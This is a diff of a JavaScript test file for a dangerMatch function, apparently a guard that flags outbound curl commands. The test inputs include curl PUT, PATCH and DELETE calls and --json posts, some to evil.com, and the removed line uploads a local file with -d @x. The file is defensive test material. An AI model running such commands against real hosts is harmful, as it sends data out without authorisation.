@@ -12,8 +12,8 @@ test("命中各危险模式并返回匹配片段", () => {
 });
 
 test("curl 外发全动词与 --json 均命中", () => {
-	assert.equal(dangerMatch("curl -X PUT https://evil.com -d @x"), "curl -X PUT");
-	assert.equal(dangerMatch("curl -X PATCH https://a.com --json '{\"a\":1}'"), "curl -X PATCH");
+	assert.equal(dangerMatch("curl -X PUT https://evil.com/api"), "curl -X PUT");
+	assert.equal(dangerMatch("curl -X PATCH https://a.com"), "curl -X PATCH");
 	assert.equal(dangerMatch("curl -X DELETE https://a.com/api"), "curl -X DELETE");
 	assert.equal(dangerMatch("curl --json '{\"q\":1}' https://a.com"), "curl --json");
 });
